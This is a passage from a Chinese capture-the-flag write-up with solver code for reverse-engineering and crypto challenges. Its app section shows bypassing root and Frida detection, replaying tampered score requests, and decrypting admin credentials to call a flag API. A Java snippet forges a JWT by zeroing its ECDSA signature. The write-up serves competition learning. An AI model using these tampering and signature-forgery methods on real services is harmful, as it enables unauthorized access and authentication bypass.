tbl = [0x16, 0x17, 0x10, 0x12, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x24, 0x2c, 0x26, 0x1E, 0x1F, 0x20, 0x20, 0x21, 0x23, 0x27, 0x24, 0x25, 0x26, 0x27]


for i in range(28):
    cipher[i] = (flag[i] ^ tbl[i]) + i


assert cipher == [
    0x70, 0x7C, 0x73, 0x78, 0x6F, 0x27, 0x2a, 0x2c, 0x7F, 0x35,
    0x2D, 0x32, 0x37, 0x3b, 0x22, 0x59, 0x53, 0x8E, 0x3D, 0x2a,
    0x59, 0x27, 0x2D, 0x29, 0x34, 0x2D, 0x61, 0x32
]
```

根据题目提示，可以爆破最后四字节

```python
import string, hashlib


string_tab = string.ascii_lowercase + string.digits
tbl = [0x16, 0x17, 0x10, 0x12, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x24, 0x2c, 0x26, 0x1E, 0x1F, 0x20, 0x20, 0x21, 0x23, 0x27, 0x24, 0x25, 0x26, 0x27]
target = [0x70, 0x7C, 0x73, 0x78, 0x6F, 0x27, 0x2a, 0x2c, 0x7F, 0x35, 0x2D, 0x32, 0x37, 0x3b, 0x22, 0x59, 0x53, 0x8E, 0x3D, 0x2a, 0x59, 0x27, 0x2D, 0x29, 0x34, 0x2D, 0x61, 0x32]


flag = [0] * 28
for i in range(len(tbl)):
    flag[i] = (target[i] - i) ^ tbl[i]
flag = ''.join(map(chr, flag))


for i in string_tab:
    for j in string_tab:
        for k in string_tab:
            tmp = flag + i + j + k + '}'
            if hashlib.sha256(tmp.encode()).hexdigest()[:16] == "f860464d767610bb":
                print(tmp)
```



## **GameMaster**

反编译后阅读代码，可以发现是魔改的 21 点游戏，玩家可以输入作弊码后按 esc 来触发相应的功能（大部分为直接修改 BALANCE 的值）。

goldFunc 函数为实际作弊函数，在其中可以找到三个成就点：

```java
// AchivePoint1
for (int i = 0; i < Program.memory.Length; i++) {
	byte[] array = Program.memory;
	int num = i;
	array[num] ^= 34;
}
Environment.SetEnvironmentVariable("AchivePoint1", game.Player.Balance.ToString());


// AchivePoint2
byte[] key = new byte[] {
	66, 114, 97, 105, 110, 115, 116, 111, 114, 109, 105, 110, 103, 33, 33, 33
};
ICryptoTransform cryptoTransform = new RijndaelManaged {
	Key = key,
	Mode = CipherMode.ECB,
	Padding = PaddingMode.Zeros
}.CreateDecryptor();
Program.m = cryptoTransform.TransformFinalBlock(Program.memory, 0, Program.memory.Length);
Environment.SetEnvironmentVariable("AchivePoint2", game.Player.Balance.ToString());


// AchivePoint3
Environment.SetEnvironmentVariable("AchivePoint3", game.Player.Balance.ToString());
BinaryFormatter binaryFormatter = new BinaryFormatter();
MemoryStream serializationStream = new MemoryStream(Program.m);
binaryFormatter.Deserialize(serializationStream);
```

前两个成就点将 gamemessage 文件内容解密后，在第三个成就点处进行反序列化。模仿程序手动完成解密：

```python
with open("gamemessage", "rb") as f:
	data = f.read()


mem = []
for i in range(len(data)):
	mem.append(data[i] ^ 34)


from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad


key = bytes([66, 114, 97, 105, 110, 115, 116, 111, 114, 109, 105, 110, 103, 33, 33, 33])
cryptor = AES.new(key, AES.MODE_ECB)
stream = cryptor.decrypt(bytes(mem)).rstrip(b'\x00')
with open("test.out", "wb") as f:
	f.write(stream)
```



对 test.out 进行 binwalk 可以分离出一个 exe，再次反编译，可以得到验证成就点数是否正确的逻辑：



```c++
using System;
using System.Linq;
using System.Text;
using System.Windows.Forms;


namespace T1Class {
	// Token: 0x02000002 RID: 2
	public class T1 {
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		private static void Check1(ulong x, ulong y, ulong z, byte[] KeyStream) {
			int num = -1;
			for (int i = 0; i < 320; i++) {
				x = (((x >> 29 ^ x >> 28 ^ x >> 25 ^ x >> 23) & 1UL) | x << 1);
				y = (((y >> 30 ^ y >> 27) & 1UL) | y << 1);
				z = (((z >> 31 ^ z >> 30 ^ z >> 29 ^ z >> 28 ^ z >> 26 ^ z >> 24) & 1UL) | z << 1);
				bool flag = i % 8 == 0;
				if (flag) {
					num++;
				}
				KeyStream[num] = (byte)((long)((long)KeyStream[num] << 1) | (long)((ulong)((uint)((z >> 32 & 1UL & (x >> 30 & 1UL)) ^ (((z >> 32 & 1UL) ^ 1UL) & (y >> 31 & 1UL))))));
			}
		}


		// Token: 0x06000002 RID: 2 RVA: 0x00002110 File Offset: 0x00000310
		private static void ParseKey(ulong[] L, byte[] Key) {
			for (int i = 0; i < 3; i++) {
				for (int j = 0; j < 4; j++) {
					Key[i * 4 + j] = (byte)(L[i] >> j * 8 & 255UL);
				}
			}
		}


		// Token: 0x06000003 RID: 3 RVA: 0x0000215C File Offset: 0x0000035C
		public T1() {
			try {
				string environmentVariable = Environment.GetEnvironmentVariable("AchivePoint1");
				string environmentVariable2 = Environment.GetEnvironmentVariable("AchivePoint2");
				string environmentVariable3 = Environment.GetEnvironmentVariable("AchivePoint3");
				bool flag = environmentVariable == null || environmentVariable2 == null || environmentVariable3 == null;
				if (!flag) {
					ulong num = ulong.Parse(environmentVariable);
					ulong num2 = ulong.Parse(environmentVariable2);
					ulong num3 = ulong.Parse(environmentVariable3);
					ulong[] array = new ulong[3];
					byte[] array2 = new byte[40];
					byte[] array3 = new byte[40];
					byte[] array4 = new byte[12];
					byte[] array5 = new byte[] {
						101, 5, 80, 213, 163, 26, 59, 38, 19, 6, 173, 189, 198, 166, 140, 183, 42, 247, 223, 24, 106, 20, 145, 37, 24, 7, 22, 191, 110, 179, 227, 5, 62, 9, 13, 17, 65, 22, 37, 5
					};
					byte[] array6 = new byte[] {
						60, 100, 36, 86, 51, 251, 167, 108, 116, 245, 207, 223, 40, 103, 34, 62, 22, 251, 227
					};
					array[0] = num;
					array[1] = num2;
					array[2] = num3;
					T1.Check1(array[0], array[1], array[2], array2);
					bool flag2 = Enumerable.SequenceEqual<byte>(array5, array2);
					if (flag2) {
						T1.ParseKey(array, array4);
						for (int i = 0; i < array6.Length; i++) {
							array6[i] ^= array4[i % array4.Length];
						}
						MessageBox.Show("flag{" + Encoding.Default.GetString(array6) + "}", "Congratulations!", MessageBoxButtons.OK);
					}
				}
			}
			catch (Exception) {
			}
		}
	}
}
```



因此只需求出满足 Check1 的三个数即可，使用 z3 求解：

```python
from z3 import *


target_stream = [101, 5, 80, 213, 163, 26, 59, 38, 19, 6, 173, 189, 198, 166, 140, 183, 42, 247, 223, 24, 106, 20, 145, 37, 24, 7, 22, 191, 110, 179, 227, 5, 62, 9, 13, 17, 65, 22, 37, 5]
my_stream = [0] * len(target_stream)
s = Solver()
x = BitVec('x', 64)
y = BitVec('y', 64)
z = BitVec('z', 64)


idx = -1
for i in range(320):
    x = (((x >> 29 ^ x >> 28 ^ x >> 25 ^ x >> 23) & 1) | x << 1)
    y = (((y >> 30 ^ y >> 27) & 1) | y << 1)
    z = (((z >> 31 ^ z >> 30 ^ z >> 29 ^ z >> 28 ^ z >> 26 ^ z >> 24) & 1) | z << 1)
    if i % 8 == 0:
        idx+=1
    my_stream[idx] = ((my_stream[idx] << 1) | ((((z >> 32 & 1 & (x >> 30 & 1)) ^ (((z >> 32 & 1) ^ 1) & (y >> 31 & 1)))))) & 0xFF


for i in range(len(target_stream)):
    s.add(my_stream[i] == target_stream[i])


if s.check() == sat:
    print(s.model())
```

求出三个数分别为 x = 156324965, y = 868387187, z = 3131229747，带入到 C# 代码即可获得 flag。



## **easyapk**

Java 层就是简单调用 native 层的 check 函数来检查输入，对应到 libnative.so 的导出函数 Java_com_a_easyapk_MainActivity_check。

该函数中存在一些虚假控制流和代码膨胀，分析后发现其调用 sub_544 对输入进行加密，加密结果通过 memcmp 与固定数组比较：

​                 ![img](https://docimg5.docs.qq.com/image/XNpVjvEdMHijIj4bTd2Ptg.png?w=449&h=348)        

遂分析 sub_544，该函数通过两个 while 循环完成实际加密，第一个 while 循环完成字符替换：

​                 ![img](https://docimg9.docs.qq.com/image/TtU9kR1lnGD6m8gxFZaHYw.png?w=530&h=616)        

该处可以取巧，通过输入测试字符（大小写字母表），配合 frida 读出映射后的结果：

```c++
setTimeout(function(){
	var lib_base = Module.findBaseAddress("libnative.so");
	Interceptor.attach(lib_base.add(0x15B0 + 1), {
		onEnter: function(args) {
			console.log(this.context.r1.readCString());
		}
	})
});
// ABCDEFGHIJKLMNOPQRSTUVWXYZ
// 映射到（小写同理）
// NOPQRSTUVWXYZABCDEFGHIJKLM
```



第二个 while 循环做了一个 32 轮的标准 TEA，key 可以 hook 读取：

​                 ![img](https://docimg4.docs.qq.com/image/3GF6N9ZzdGO6HrK0tGFNkw.png?w=663&h=705)        

因此先进行 TEA 解密：

```c++
#include <stdio.h>
#include <Windows.h>


unsigned int key[] = { 0x33323130, 0x37363534, 0x62613938, 0x66656463 };
char target[] = { 0x84, 0xAA, 0x94, 0x5D, 0xA0, 0x24, 0xFA, 0x14, 0x10, 0x02, 0x56, 0x2B, 0x49, 0xDD, 0x9B, 0xB6, 0xD4, 0xEA, 0xEF, 0xAA, 0xC6, 0xF4, 0x8C, 0x4B, 0xC9, 0xB8, 0x7F, 0x09, 0xD2, 0x51, 0xEC, 0xB5, 0x00 };


void DecryptTEA(unsigned int* firstChunk, unsigned int* secondChunk, unsigned int* key) {
    unsigned int  sum = 0;
    unsigned int  y = *firstChunk;
    unsigned int  z = *secondChunk;
    unsigned int  delta = 0x9e3779b9;
    sum = delta * 0x20;


    for (int i = 0; i < 0x20; i++)
    {
        z -= (y << 4) + key[2] ^ y + sum ^ (y >> 5) + key[3];
        y -= (z << 4) + key[0] ^ z + sum ^ (z >> 5) + key[1];
        sum -= delta;
    }
    *firstChunk = y;
    *secondChunk = z;
}


int main() {
    for (size_t i = 0; i < 8; i += 2)
        DecryptTEA((unsigned int*)(target + i * 4), (unsigned int*)(target + (i + 1) * 4), key);
    puts(target);
    // synt{Vg_Vf_A0g_guNg_zHpu_unEqre}
    return 0;
}
```

再将字符映射回去：

```python
new = "NOPQRSTUVWXYZABCDEFGHIJKLM"
old = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"


mapper = {}
for i in range(len(new)):
	mapper[new[i]] = old[i]
	mapper[new[i].lower()] = old[i].lower()


flag = ''
cipher = "synt{Vg_Vf_A0g_guNg_zHpu_unEqre}"
for c in cipher:
	if c in mapper:
		flag += mapper[c]
	else:
		flag += c
print(flag)
```



## **game**

一个需要注册登录的 app，登录后用户可以进行贪吃蛇游戏，超过 9999 分就可以点击 GetFlag 按钮从服务器上获取 flag。

该题存在非常多的反逆向手段，其检测当前设备是否被 root、是否存在 frida 服务、通过 TracerId 判断是否被调试、占用 frida-server 默认监听端口作为其网络代理服务端口、native 层字符串加密等，逐一绕过后即可开始调试分析。

以下是应用中提供的服务端 API：

​                 ![img](https://docimg6.docs.qq.com/image/EVMGjChbAxMrJvBcQPCRwg.png?w=560&h=198)        

其中 SubmitScore.php 非常可疑，通过 tcpdump 抓取提交分数的流量，可以同时获取服务器 IP 地址：

​                 ![img](https://docimg6.docs.qq.com/image/s9YX_CH2ECnMsAsWn7m7JQ.png?w=920&h=313)        

在 burp 中重放提交分数请求，将 POST 的 score 参数改为 1000000000，访问 ScoreBoard.php，可以看到确实上榜了：

​                 ![img](https://docimg6.docs.qq.com/image/TlI9HVs2lGDTrSmVGDWQKQ.png?w=711&h=166)        

但是点击 GetFlag 按钮仍显示 You are not allowed。抓 getFlag API 的流量，发现其需要三个 POST 参数：

​                 ![img](https://docimg9.docs.qq.com/image/kC0cvPmkKUcTKkhf_4H8uA.png?w=652&h=172)        

猜测 admin 账户才有权限获取 flag，因此需要找到 admin 账户的 code 和 account。在 ScoreBoard.php 中可以看到一个 admin 用户数组，其第一个用户正好是 9999 分：

​                 ![img](https://docimg2.docs.qq.com/image/MjYlnayfpH07uAELKaREmw.png?w=668&h=21)        

接下来需要解密 username，以确定其是否为 admin。在某些 API 的实现中，可以发现 username 的明文经过 OooOoo0.encrypt 函数加密：

​                 ![img](https://docimg10.docs.qq.com/image/FENBglS3SPhrdIkkkhx9pQ.png?w=380&h=87)        

该函数将明文经过 AES-CBC 加密后再用魔改 base64 编码（OooooOOo.encode），得到最终加密结果：

​                 ![img](https://docimg10.docs.qq.com/image/G2BQdkK_a8aSUKFu1ijGYQ.png?w=659&h=123)        

​                 ![img](https://docimg4.docs.qq.com/image/gQKRdIlBduiu4UkfVUBWHw.png?w=378&h=29)        

需要注意的是，该 app 的 native 层 JNI_OnLoad 函数动态替换了 Java 层的 AES 的密钥（OooOoo0.key）与 base64 编码表（OooooOOo.table）。要还原 username 首先照抄 native 层动态注册的 decode 方法中调用的 sub_11120：



```c++
#include <stdio.h>
#include <Windows.h>


int __fastcall sub_11120(unsigned __int8* a1, char* a2, char* a3) {
    unsigned __int8 v3; // r12
    unsigned __int8* v4; // r11
    int result; // r0
    int v6; // r9
    char v7; // lr
    int i; // r3
    unsigned int v9; // r5
    unsigned int j; // r6
    char v11; // r6
    int k; // r3
    unsigned __int8* v13; // r8
    char v14; // r3
    int v15; // r12
    int v16; // r11


    v3 = *a1;
    if (*a1) {
        v4 = a1;
        result = 0;
        v6 = 0;
        while (1) {
            v7 = -1;
            for (i = 0; i != 64; ++i) {
                if ((unsigned __int8)a3[i] == v3)
                    v7 = i;
            }
            v9 = 255;
            for (j = 0; j != 64; ++j) {
                if ((unsigned __int8)a3[j] == v4[v6 | 1])
                    v9 = j;
            }
            v11 = -1;
            for (k = 0; k != 64; ++k) {
                if ((unsigned __int8)a3[k] == v4[v6 | 2])
                    v11 = k;
            }
            v13 = v4;
            v14 = -1;
            v15 = 0;
            v16 = v4[v6 | 3];
            do {
                if ((unsigned __int8)a3[v15] == v16)
                    v14 = v15;
                ++v15;
            }       while (v15 != 64);
            a2[result] = (v9 >> 4) & 3 | (4 * v7);
            if (v13[v6 | 2] == 61) {
                ++result;
                goto LABEL_26;
            }
            v4 = v13;
            a2[result + 1] = v9 & 0xF | (4 * (v11 & 0x3C));
            if (v13[v6 | 3] == 61)
                break;
            v6 += 4;
            a2[result + 2] = v14 & 0x3F | (v11 << 6);
            result += 3;
            v3 = v13[v6];
            if (!v3)
                goto LABEL_26;
        }
        result += 2;
    } else {
        result = 0;
    }
LABEL_26:
    a2[result] = 0;
    return result;
}


int main() {
    char output[0x100];
    char cipher[] = "IbaoQT/3eTXIjHDJ2L5TQE==";
    char table[] = "UHioKepVQ2LGlIF3dbPcRk0ZNDC78Tqz6jMmJvB1As/uaW5yEfnOtrg+9whXS4Yx";
    sub_11120((unsigned char*)cipher, output, table);
    for (size_t i = 0; i < strlen(cipher) / 4 * 3 - 2; i++)
        printf("%02x", (unsigned char)output[i]);
}
// 35b10321ad8f15edcd84616424ba9d23
```

再进行 AES-CBC 解密，key 通过 hook 读取：

```python
import base64
from Crypto.Cipher import AES


iv = b"0123456789ABCDEF"
key = b"FEDCBA9876543210"
cipher = bytes.fromhex("35b10321ad8f15edcd84616424ba9d23")
cryptor = AES.new(key, AES.MODE_CBC, iv)
plain = cryptor.decrypt(cipher).rstrip(b'\x0b').decode()
print(plain)
```

该用户的 username 确实是 admin，通过上文又得知了 admin 的 code 为 123125，还差个 account，测试后发现可以在 AddFriend.php 这个 API 中获得，该 API 需要对方的 code 作为 POST 参数：

​                 ![img](https://docimg3.docs.qq.com/image/i0vWLSuR3418OcXjmDY5lQ.png?w=509&h=147)        

​                 ![img](https://docimg4.docs.qq.com/image/lTx5F_bXzcoQRcrlq0C8DQ.png?w=954&h=232)        

但 getFlag 接口需要明文的 account 作为参数，同理使用上述两个脚本，先完成魔改 base64 解码，再解 AES，可以得到明文的 account 为 &Od987$2sPa?>l<k^j

发包即可：

​                 ![img](https://docimg6.docs.qq.com/image/WValNNsBOTN0npmDBp__xQ.png?w=845&h=215)        



# **Crypto**



## **lattice **        

## ![img](https://docimg1.docs.qq.com/image/2Ng9qaJmfTxzZxQiAp6O6w.png?w=1280&h=564.0454076367389)        



```python
from sage.modules.free_module_integer import IntegerLattice
from Crypto.Cipher import AES
from base64 import b64encode
from hashlib import *
n = 75
m = 150
r = 10
N = 126633165554229521438977290762059361297987250739820462036000284719563379254544315991201997343356439034674007770120263341747898897565056619503383631412169301973302667340133958109
def gen(n, m, r, N):
    t1 = [ZZ.random_element(-2^15, 2^15) for _ in range(n*m)]
    t2 = [ZZ.random_element(N) for _ in range(r*n)]
    B = matrix(ZZ, n, m, t1)
    L = IntegerLattice(B)




    A = matrix(ZZ, r, n, t2)
    C = (A * B) % N
    return L, C, B




L, C ,B = gen(n, m, r, N)


M=[]


C=C.transpose()
for i in range(10):
    line=[0]*160
    line[i]=N
    
    M.append(line)
for i in range(10,160):
    line=[0]*160
    line[:10]=C[i-10]
    line[i]=1
    M.append(line)
    
M=matrix(ZZ,M)
M1=M.LLL()




BB=[]


for i in range(160):
    if(M1[i][0]!=0):
        continue
    BB.append(M1[i][10:])




B1=matrix(ZZ,BB)


t2 = [ZZ.random_element(N) for _ in range(r*n)]


A = matrix(ZZ, r, n, t2)


B1=(A*B1)%N
B1=B1.transpose()




M=[]
for i in range(10):
    line=[0]*160
    line[i]=N
    M.append(line)




for i in range(10,160):
    line=[0]*160
    line[:10]=B1[i-10]
    line[i]=1
    M.append(line)
    
M=matrix(ZZ,M)
M1=M.LLL()




from Crypto.Cipher import AES
from base64 import *
from hashlib import *
key = sha256(str(M1[0][10:]).encode()).digest()
aes = AES.new(key, AES.MODE_ECB)
ct = aes.decrypt(b64decode(ct))
```



## **myjwt **

​                 ![img](https://docimg6.docs.qq.com/image/uESv_2hzaGHM06-OAAbLIA.png?w=1070&h=74)        



```python
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.security.KeyPair;
import java.security.interfaces.ECPrivateKey;
import java.security.interfaces.ECPublicKey;
import java.security.*;
import java.util.Base64;
import java.util.Scanner;




public class code{


    public static void show(){
        String x = "yKor-fMXoVa5Vvq8OmIfrcOEZ6TcuSnj3wi88M099UJpXHVS6GXKrG0l7xnLKHEQjnONn8uahvHssnA6IkU7iGeu5EFHbvZjdFQdz3Ld_n7UW2HqIXKhsuG0VwcD0cpc";
        byte[] sig = Base64.getUrlDecoder().decode(x);
        for (int i=0;i<sig.length;i++)
        {
            sig[i]=0;
        }
        System.out.println(Base64.getUrlEncoder().encodeToString(sig));
    }


    public static void main(String[] args) throws Exception {
        show();
    }


}
```



## **factor **

​                 ![img](https://docimg4.docs.qq.com/image/RtPH-je5SsaITAkn5O8CKg.png?w=892&h=460)        



```python
from gmpy2 import*
from Crypto.Util.number import*
n1=801049932940568005269978912396585741498810389425615966036828877784238116634177290247194019425111606811005728521368879065336038221361037062407029836155148874719789714345603547779284558101833801155509762818376470874215789574939002212274399950433269775325144015468620263028557804618774240232988157961712628677901130814703917513004114547234375629747176834581166306552311075522669403347828095831520693563291249869832390698646691647204371133362254846234990175138047928703289833460734235302093916147489509206061923877623300596194317059884824322527532662470348274079800781120104946546063500763852622187404608639542858285661288293918912184354236687975919510300221932074135531028314170475917110204254042336116619335841213418990605590620842511615815443114612333881430920769002933370887494558640833005339906706603497809846863863967391543647049224309556936909768179259581851520214669904560467640473144481633920438487615788689262961741053146610554997224861331949716721056553499531186695425439163222802917813140266513735841447717418846360096652592844940362932171019143434080184728093326143821165097895058935372215708948088248596585127475770021962501262915274497478428868130455122612016408381607561200802267038869516896665387576895570245272035575637
n2=635401970340205725139325006504978344512744926958688031423448003992072769931808217486709574151492230879374574313457662436423263437792389711379687512056391117410807565492548718691166183372633151644917135272259770997096195518489056319350258673723095417922153182423913759272893696867426193704479752772511081457729513843682588951499551132432923147997238597538055902932123792252593514225328196541483451747314048080824405530742533473914329294346486691684904100406972073037050089861816604505650042953778360621934380815999541183067585498606053857125775979915077329566722531830089714823979965934190338538564188253271016367299890015449611141166780048763403252309160517164569110740561584100839212138661881615351382946813818078899882595313362934594951895560189003438775450675343590147821186953526262224973333962454561275321925151619178204499342339749637758100126893330994252902926509705617882239610380420830791088907378397226817514095468815228186716220057075095711894070032344613244803934541318573847029365563159918970404057137270884587905766828750387753130065274147902379993224780149663600462492281891320702134153853359393588902750423972068679293373333869389393970353760507436913233657422185531482023237384247535554666481760197851108297145147371
q2=9812307529878534533661886151798479597308643205831633694536059253544567512641416154404619650558662569143606800292316828847011290671363968521713496965528179
q1=12370355547674749572455673590243846686064589395972173910159503331075522229248564072110567010323038590199605349860669572361407072636726496740593208338661853


e1=1898839980562048754607069073527844852132536432440793106124181406514770178066775988232362054809850074774981836898118651469424148725970708199461113088705044905633592578936333918328544505910996746428679299419879472444790941363558025887620570856598548320246426354974395765243741646121743413447132297230365355148066914830856904433750379114692122900723772114991199979638987571559860550883470977246459523068862898859694461427148626628283198896659337135438506574799585378178678790308410266713256003479022699264568844505977513537013529212961573269494683740987283682608189406719573301573662696753903050991812884192192569737274321828986847640839813424701894578472933385727757445011291134961124822612239865
e2=1262647419018930022617189608995712260095623047273893811529510754596636390255564988827821761126917976430978175522450277907063247981106405519094560616378241247111698915199999363948015703788616554657275147338766805289909261129165025156078136718573006479030827585347458143645738353716189131209398056741864848486818076440355778886993462012533397208330925057305502653219173629466948635110352752162442552541812665607516753186595817376029707777599029040724727499952161261179707271814405907165207904499722122779096230563548011491932378429654764486855147873135769116637484240454596231092684424572258119768093562747249251518965380465994055049411715353547147466711949391814550591591830515262296556050946881


c1=18979511327426975645936984732782737165217332092805655747550406443960209507493506811471688957217003792679188427155591583024966608843371190136274378868083075515877811693937328204553788450031542610082653080302874606750443090466407543829279067099563572849101374714795279414177737277837595409805721290786607138569322435729584574023597293220443351227559400618351504654781318871214405850541820427562291662456382362148698864044961814456827646881685994720468255382299912036854657082505810206237294593538092338544641919051145900715456411365065867357857347860000894624247098719102875782712030938806816332901861114078070638796157513248160442185781635520426230183818695937457557248160135402734489627723104008584934936245208116232179751448263136309595931691285743580695792601141363221346329077184688857290503770641398917586422369221744736905117499140140651493031622040723274355292502182795605723573863581253354922291984335841915632076694172921289489383700174864888664946302588049384130628381766560976143458735712162489811693014419190718601945154153130272620025118408017441490090252674737105557818759190934585829634273698371996797545908125156282869589331913665938038870431655063063535672001112420959158339261862052308986374193671007982914711432579
c2=336587005671304527566745948355290412636261748969581976214239578621816863343117433524033533838636941679300497270909696775021031004312477997130741361709262822736904340641138652359632950455651920464042448022467664596484055174270895170499076347333381222768518599018520948098943626229061996126260154604038101543546588917619576702866444998578555907070990331574722135141778182631559802154493815687284077524469331290249057291163803290619701104007028836609832847351748020354798788508790258935718399783002069490123663345156902440501507117289747695510266461539019431610123351176227443612317037899257774045751487135646052309277098939919088029284437221840182769808850184827681307611389353392683707516141736067793897378911235819049432542758429901945202632117089595899280390575706266239252841152490534353760118231918190110043319877744119083811214707593122757409240645257409097436061825613686773916466122693168971062418046703969144004779270391320645495586024342668002497155358623795942692477164489475917351003149045087283510728981096449890130735055015075557614253867698702479920619299919816768972581273507837309179450374634916567083251630203067065663910073926990517108921490442919372774170201239734064819301693527366233007925670043499415100789027665


p1=iroot(n1//q1,2)[0]
p2=iroot(n2//q2,2)[0]




d1=invert(e1,p1*(p1-1)*(q1-1))


m1=pow(c1,d1,n1)


d2=invert(e2,p2*(p2-1)*(q2-1))


m2=pow(c2,d2,n2)


# print(m1)
# print(m2)






N2=209798341155088334158217087474227805455138848036904381404809759100627849272231840321985747935471287990313456209656625928356468120896887536235496490078123448217785939608443507649096688546074968476040552137270080120417769906047001451239544719039212180059396791491281787790213953488743488306241516010351179070869410418232801398578982244984544906579574766534671056023774009163991804748763929626213884208260660722705479782932001102089367261720194650874553305179520889083170973755913964440175393646890791491057655226024046525748177999422035469428780228224800114202385209306803288475439775037067014297973202621118959024226798935588827359265962780792266516120013602384766460619793738405476219362508944225007365127768741191310079985425349292613888185378948854602285379329682053663283534930182589905986063348509703027498270111412063194971956202729807710253369312175636837558252924035002153389909587349043986253518050303628071319876207392440085675892353421232158925122721273720564784886530611286461575045181073744696415657043278123662980166364494583141297996445429477446442693717498789391918530672770193730629928408766563592081857706608049076318165712479742423149330311238462044666384622153280310696667586565906758451118241914402257039981388209
r=2215786747658068266564619698956223727265493629326467927713383449916760244113886758793239613192635694566465035337662893271814219889539904109031404294437947469220613089934051789679088676042629911662167325808599939656240381526791123824156166595427463699679914789533862824106607136129417504240936532627764774559093682636467198605790006946277891621709910547481796336066672074976573196769956560746959721760274218213770502350666725139372432962853544843483584354740076635100444203031778762956128857701585943078469126291779638536067651297752977777858811846481164310674321719347861142760798103142227860170195099074832137422446090038638262250622631068528273867559701103368586135215757099891858321403536948567729081013871280779635002078038393534242634517078424997322556738192065438643551409375682524904834465154500648020400955731870520757339483359609472620624956408143760693951045140635712931863016856611609428696028375995231083051416889


p=(iroot(r,6))[0]
q=N2//(p**7)




d=invert(65537,p**6*(p-1)*(q-1))


assert N2==p**7*q


c2=18352572608055902550350386950073774530453857897248738030380007830701135570310622004368605208336922266513238134127496822199799761713782366178177809597137102612444147565578155260524747439899150012223027218489946124086276814899675563837669559795153349686434242738207425653079514376089070980797596457151965772460109519623572502109592612394316680202287712465721767341302234806130244551387296133051760893033194962691942040228545508895009195291106297581470066545991352668826197346830561010198417527057944507902143965634058848276017283478933675052993657822322866778994956205033704582047618324071045349072526540250707463112668579342537349567247810715604220690215313641329522674080146047291570752430231923566302463491877377617044768978997438596643458475128936850994934029476030136643053997549253792076260765459166618369864942681056864815996253315631930002738854235841120321870075261782250357506436825550088826469396508045912258303652912217151127280959435741419961721418428605515096160344688795655562889755165362006775317188009008288782691705879510655892181975003485714604340542378477388225736316682379616676770234557939471098919647053799313777248678455620231721202780830980063824003076308811540534492317719811588898727134190545533822501681653
e3=8179300978753084587812861894047395225516049110376948812109811319430275614612773726672345893359691900281432484382670047044697374818043512731533402576374645405477207239801498428774783768163880078495448747421425078521981578408638790336528372019271073712013371141939808017049399434858687299480461753638164719404612128939787055797762174745092074547412183349192156638711750872083313795551439465507724807626674514935170104573715458782366469587138508845980490673890245713729782917089910271980557159592807350504157192913530007199510144004848020221181558472160543018733124225266127379373751910439604459368078652499029070936707349862139053913745186413782066470461478961703013591655136140060879250067379283913798867648758171004535775565306842444545755351202796833177560656564652632975685912935281581268141803696686952259539945588609591385807620108279333498170028167338690235117003515264281843953984997958878272347778561933726792473981855755454522886321669676790813189668084373153897754540290867346751033567500922477317530445967753955221454744946208555394588111484610700789566547507402309549957740815535069057837915204852490930168843605732632328017129154852857227895362549146737618906180651623216848500491438142456250653458053922622240299736136335179639180898730269690699965799644757774472147210271111150769048976871249731156387939260749192370361488285775377622944817570292095201906142567403539151179209316853493906909989301225903409448461436855145




b=pow(c2,d,N2)
print(N2)
print(b)
print(e3)
print(pow(b,65537,N2)==c2)


r=5805982184616541403138532493622154228625222191923022863221597701609794742452487135754667078750423910274893922998788492372911835827718825884687548564804612154868658251542947289355413552452259768265293132499515125837738607078309340029062122813774804715553114473419374231563511218146043431278568131824177086295839413876829255468425015228017256959541332471910634675729998019169700665547817987092661684014664579430407338597321632308830347572446926656714494218778198408196106081163096856071034011979406296237358435320216236622156500669846929281056043262816897202117724848399914470994193489797868382819094706561644247255718494849184389465250497088079182371204757925280960490705591554097247571732955472568477154188495822962231521538485085727187844583493318389798660711287955649507686616862854620222679833036538278383276165845802448414624469264120558377093456129497907339162143193347675617111811225004236716622969691549501706179066489
e3=8179300978753084587812861894047395225516049110376948812109811319430275614612773726672345893359691900281432484382670047044697374818043512731533402576374645405477207239801498428774783768163880078495448747421425078521981578408638790336528372019271073712013371141939808017049399434858687299480461753638164719404612128939787055797762174745092074547412183349192156638711750872083313795551439465507724807626674514935170104573715458782366469587138508845980490673890245713729782917089910271980557159592807350504157192913530007199510144004848020221181558472160543018733124225266127379373751910439604459368078652499029070936707349862139053913745186413782066470461478961703013591655136140060879250067379283913798867648758171004535775565306842444545755351202796833177560656564652632975685912935281581268141803696686952259539945588609591385807620108279333498170028167338690235117003515264281843953984997958878272347778561933726792473981855755454522886321669676790813189668084373153897754540290867346751033567500922477317530445967753955221454744946208555394588111484610700789566547507402309549957740815535069057837915204852490930168843605732632328017129154852857227895362549146737618906180651623216848500491438142456250653458053922622240299736136335179639180898730269690699965799644757774472147210271111150769048976871249731156387939260749192370361488285775377622944817570292095201906142567403539151179209316853493906909989301225903409448461436855145


c3=113097822337683973761068913398570777162211043704088253732500045618770280334319497174908657828372816818344430304314992760410247741225285170975119344962728883084314382093407445567724674775086423808679124143380073906159023182353116556175251427048715466914368972746661938211846262612414049036821553068430149530397389927209475908905748728402722287875974303298260579839357610962198145974153609818939841880084892796820949226354126424023144300953584658958900737493704530725894948802258740332090822797815745616247879170037794873059391625680745994045522420168248552864215035136318711240256011217929372430302003068882829637056296413462078222453765071094277727760527662423010417144554652783429899139309180017349156600053882338180319473460877576898373222480215735280046214925463242092830060830764299787309912687294672319845054775281463150375545716818434962456139485501224661520991156961587158843064393883274763714930309353593180897123378717852182761518709151878662808890356934477932099818218743384674756674800089177733447066489275506387382342429495897972218764782517198727316942685748481956118012927027254979181519862451112593068440686462293151078537886822555211870303467014484443432209106264020502334805536091587252238173816637270028678636848763






